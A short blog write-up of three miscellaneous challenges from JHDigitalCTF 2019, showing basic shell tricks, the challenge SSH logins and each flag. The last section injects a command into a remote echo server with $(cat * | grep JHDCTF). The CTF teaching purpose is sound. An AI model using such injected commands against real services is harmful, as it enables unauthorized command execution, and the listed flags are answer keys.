---
slug: writeup-jhdigital-ctf-misc
title: Writeup JHDigitalCTF (John Hammond Digital CTF) 2019 Kategori [MISC]
date: 2019-11-10
year: 2019
image: null
author: Bardizba
keywords: [WRITE-UP JHDigitalCTF 2019 Misc]
description: WRITE-UP JHDigitalCTF 2019 Misc
excerpt: Miscellaneous Category Writeup for  JHDigitalCTF (John Hammond Digital CTF) 2019
tags : ["ctf","jhdctf"]
---
## Catalias

```bash
Hmmm… maybe missing a hyphen somewhere?

Note: This password is reset every five minutes. If you are on the wrong side of the clock, you may need to reconnect.

Connect with:

ssh user@jh2i.com -p 50004 # password is 'userpass'
```

in this problem, cat command is aliased, so we need to call it directly using its path.

```bash
/bin/cat flag.txt
```

```bash
FLAG = JHDCTF{you_let_the_cat_out_of_the_bag}
```
<br/>

## Hidden

```bash
Hidden
60
What secret is this server hiding?!

Connect with:

ssh user@jh2i.com -p 50015 # password is 'userpass'
```

first, write __ls -lah__ command, and it showing that there's *.secret* directory. and cd to those directory is restricted. we can use ls and its listring ._dont_delete_me.txt.

write this command:
```bash
cat .secret/._dont_delete_me.txt
```

```
flag = JHDCTF{you_found_my_hidden_secrets}
```
<br/>

## Chasm
```bash
Chasm
60
The Internet’s new echo server. Break it.

Connect with:

nc jh2i.com 50006
```

it's a remote server that run echo. so we can write __$(command)__

```bash
$(cat * | grep JHDCTF)
```

    flag = JHDCTF{dangerous_echoes_in_this_chasm}
